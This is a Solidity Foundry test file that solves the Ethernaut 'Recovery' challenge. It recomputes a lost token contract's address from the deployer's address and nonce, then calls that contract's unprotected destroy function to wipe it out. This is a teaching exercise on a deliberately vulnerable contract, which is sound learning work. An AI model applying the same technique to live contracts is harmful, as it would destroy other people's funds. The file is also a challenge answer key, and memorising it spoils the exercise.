// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {RecoveryFactory} from "../src/17-Recovery/RecoveryFactory.sol";
import {Recovery, SimpleToken} from "../src/17-Recovery/Recovery.sol";

contract RecoveryTest is Test {
    Ethernaut public ethernaut;
    address user = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(user, 5 ether);
    }

    function test_RecoveryAttack() public {
        // SETUP
        RecoveryFactory recoveryFactory = new RecoveryFactory();
        ethernaut.registerLevel(recoveryFactory);
        vm.startPrank(user);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);

        // ATTACK
        address simpleTokenAddress =
            address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), levelAddress, uint8(0x01))))));
        SimpleToken simpleToken = SimpleToken(payable(simpleTokenAddress));
        simpleToken.destroy(payable(address(0)));

        // SUBMIT
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
        vm.stopPrank();
    }
}
